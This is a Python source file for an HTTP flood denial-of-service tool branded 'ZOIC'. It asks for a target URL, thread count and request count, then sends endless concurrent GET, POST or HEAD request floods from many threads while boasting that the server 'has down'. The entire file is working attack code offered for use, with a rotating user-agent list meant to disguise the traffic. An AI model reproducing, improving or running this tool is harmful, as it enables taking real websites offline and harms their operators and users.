import os
import sys
import asyncio
import aiohttp
import threading
import random

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m" 
    RADICAL_RED = "\033[38;5;160m"
    DARK_GREEN = "\033[38;5;28m"

user_agent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Safari/537.36",
    "Mozilla/5.0 (Windows NT 5.1; rv:41.0) Gecko/20100101 Firefox/41.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.1.1; Nexus 5X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.98 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G935F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 7.1.2; SM-A510F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A605G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.119 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.97 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1.1; SM-G531F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Firefox/31.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0"
]

def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.LIGHT_GREEN + """
        ██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗
        ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║
        ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝
        ██║     ██╔══██║  ╚██╔╝  ██╔══╝  ██╔══██╗       ██╔╝ 
        ███████╗██║  ██║   ██║   ███████╗██║  ██║       ██║  
        ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝  
          
╔════════════════════════════════════════════════════════════════════╗
║                    https://doxwebd.serveo.net                      ║ 
║════════════════════════════════════════════════════════════════════║
║                                                                    ║                       
║                     get   |  get  request attack                   ║
║                     post  |  post request attack                   ║
║                     head  |  head request attack                   ║
║                     exit  |  exit zoic                             ║
║                                                                    ║
║                                                                    ║                                                                     
╚════════════════════════════════════════════════════════════════════╝
""")

def layer7():
    while True:
        logo()
        select = input(TextColors.GREEN + """═══[root@ZOIC~$]                                                                   
═══> """ + TextColors.RESET)

        if select == "get" or select.lower() == "1":
            async def send_request(session, url):
                headers = {
                    "User-Agent" : random.choice(user_agent)
                }
                try:
                    async with session.get(url) as response:
                        print(TextColors.CYAN + f"[+] Url : {url} [*] GET Request : {get_requests}" + TextColors.RESET)
                except aiohttp.ClientConnectorError:
                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                except aiohttp.client_exceptions.ServerDisconnectedError:
                    print(TextColors.CRIMSON + f"[-] Server disconnected ZOIC !!" + TextColors.RESET)
                except Exception as e:
                    print(TextColors.CRIMSON + f"[-] Unexpected error: {str(e)}" + TextColors.RESET)

            async def send_requests(url, get_requests):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_request(session, url) for _ in range(get_requests)]
                    await asyncio.gather(*tasks)

            def send_thread(url, get_requests):
                while True:
                    asyncio.run(send_requests(url, get_requests))

            def start_threads(url, threads, get_requests):
                threads = []
                for _ in range(get_requests):
                    thread = threading.Thread(target=send_thread, args=(url, get_requests))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()  

            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.WHITE + "Thread (5~30) > "+ TextColors.RESET))  
            get_requests = int(input(TextColors.WHITE + "Get (100~500) > "+ TextColors.RESET))    

            start_threads(url, threads, get_requests)


        elif select == "post" or select.lower() == "2":
            async def send_post_request(session, url):
                headers = {
                    "User-Agent" : random.choice(user_agent)
                }
                try:
                    async with session.post(url) as response:
                        print(TextColors.CYAN + f"[+] Url : {url} [*] POST Request : {post_requests}" + TextColors.RESET)
                except aiohttp.ClientConnectorError:
                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                except aiohttp.client_exceptions.ServerDisconnectedError:
                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
                except Exception as e:
                    print(TextColors.CRIMSON + f"[-] Unexpected error : {str(e)}" + TextColors.RESET)

            async def send_requests(url, num_requests):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_post_request(session, url) for _ in range(num_requests)]
                    await asyncio.gather(*tasks)

            def send_thread(url, num_requests):
                while True:
                    asyncio.run(send_requests(url, num_requests))

            def start_threads(url, num_threads, num_requests):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, num_requests))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()

            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.WHITE + "Thread (5~30) > "+ TextColors.RESET))  
            post_requests = int(input(TextColors.WHITE + "Get (100~500) > "+ TextColors.RESET))   

            start_threads(url, threads, post_requests)

        elif select == "head" or select.lower() == "3":
            async def send_head_request(session, url):
                headers = {
                    "User-Agent" : random.choice(user_agent)
                }
                try:
                    async with session.head(url) as response:
                        print(TextColors.CYAN + f"[+] Url : {url} [*] HEAD Request : {head_requests}" + TextColors.RESET)
                except aiohttp.ClientConnectorError:
                    print(TextColors.CRIMSON + f"[-] Server has down by ZOIC !!" + TextColors.RESET)
                except aiohttp.client_exceptions.ServerDisconnectedError:
                    print(TextColors.CRIMSON + f"[-] Server disconnected by ZOIC !!" + TextColors.RESET)
                except Exception as e:
                    print(TextColors.CRIMSON + f"[-] Unexpected error: {str(e)}" + TextColors.RESET)

            async def send_requests(url, num_requests):
                async with aiohttp.ClientSession() as session:
                    tasks = [send_head_request(session, url) for _ in range(num_requests)]
                    await asyncio.gather(*tasks)

            def send_thread(url, num_requests):
                while True:
                    asyncio.run(send_requests(url, num_requests))

            def start_threads(url, num_threads, num_requests):
                threads = []
                for _ in range(num_threads):
                    thread = threading.Thread(target=send_thread, args=(url, num_requests))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()

            url = input(TextColors.WHITE + "URL > "+ TextColors.RESET)
            threads = int(input(TextColors.WHITE + "Thread (5~30) > "+ TextColors.RESET))  
            head_requests = int(input(TextColors.WHITE + "Get (100~500) > "+ TextColors.RESET))  

            start_threads(url, threads, head_requests)


        elif select == "exit" or select.lower() == "4":
            sys.exit()
    
             


if __name__ == "__main__":
    layer7()
